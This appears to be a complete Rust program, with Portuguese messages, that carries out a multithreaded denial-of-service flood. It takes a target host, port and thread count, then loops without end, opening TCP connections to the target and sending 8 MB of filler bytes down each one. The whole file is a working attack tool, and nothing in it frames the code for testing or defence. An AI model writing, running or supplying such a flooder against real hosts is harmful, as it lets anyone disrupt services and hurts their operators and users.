use std::env::args;
use std::process;
use rayon::prelude::*;
use std::net::TcpStream;
use std::io::{Write, Read};


#[derive(Debug)]
struct Config{
    Host: String, 
    Port: u64,
    Threads: u64
    

}

impl Config {
    pub fn new(Host: String,Port: u64, Num_Threads: u64 ) -> Config {
        Config{Host: Host, Port: Port, Threads: Num_Threads}
    }
}
fn argsRecev() -> Result<Vec<String>, &'static str> {
    let args_send: Vec<String> = args().collect();
    if args_send.len() < 4{ // [0] path caminho [1] Host [2] Port
        return Err("Modo de uso: ./bin Host Port Threands");
        //process::exit(1);
    }
    Ok(args_send)
}
fn main(){

    println!("Dos Multithread");

    let argsArray = match argsRecev(){
        Ok(array) => array,
        Err(valor) => {
            println!("{}", valor);
            process::exit(1);   
        }
    }; 
    let a = Config::new(argsArray[1].clone() , argsArray[2].clone().parse::<u64>().unwrap_or_else(|x|{
    println!(" A porta não pode ser um String");
    process::exit(1);
    }), argsArray[3].clone().parse::<u64>().unwrap_or_else(|x|{
        println!(" A thread não pode ser um String");
        process::exit(1);
        } ));

    let num_threads = a.Threads;
    

    loop {
        (0..num_threads).into_par_iter().for_each(|_|
            {SendBytesAndConnect(a.Host.clone(), a.Port);
                SendBytesAndConnect(a.Host.clone(), a.Port);
           });
    }

    
    

    
      

 
  

}
fn SendBytesAndConnect(Host: String, Port: u64){

    
    for y in 0..100000 {
    let mut TcpConectBySend = TcpStream::connect(format!("{}:{}",&Host,Port)).unwrap_or_else(|x| {
        println!("Erro: {}",x);
        process::exit(1);
    });

    println!("{}", y);
    let mut buffer = [0; 1224];


   
    TcpConectBySend.write(&DataPayload());

    //println!("{:?} = {:?}", TcpConectBySend.peer_addr().unwrap(), TcpConectBySend.local_addr().unwrap());
    
}
}

fn DataPayload() ->  Vec<u8> {
    // enviar 8MB por thread
    let mut bytes = Vec::with_capacity(1024 * 1024 * 8);
    for _ in 0..1024 * 1024 * 8 {
        bytes.push(b'X');
    }
    
    bytes

    
}